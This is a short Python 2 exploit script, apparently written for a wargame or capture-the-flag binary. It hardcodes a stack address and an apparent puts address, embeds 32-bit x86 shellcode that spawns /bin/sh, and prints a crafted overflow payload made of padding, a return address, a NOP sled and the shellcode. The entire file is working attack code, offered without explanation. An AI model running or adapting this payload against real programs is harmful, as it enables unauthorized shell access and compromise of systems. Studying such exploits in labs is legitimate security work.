import os
import sys
import struct
import time

first_data = "*" * 20 + "\n"

shellcode_addr = 0xbffff650

shellcode =  "\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x89\xc1\x89\xc2\xb0\x0b\xcd\x80\x31\xc0\x40\xcd\x80"

puts_addr = 0x80498f0

time.sleep(7)

print >> sys.stdout, first_data
print >> sys.stderr, first_data

sys.stdout.flush()

time.sleep(7)

second_data = "AAAABBBBC" + struct.pack("I", shellcode_addr) + "\x90" * 10 + shellcode + "0" * 20 +'\n'

print(second_data)

sys.stdout.flush()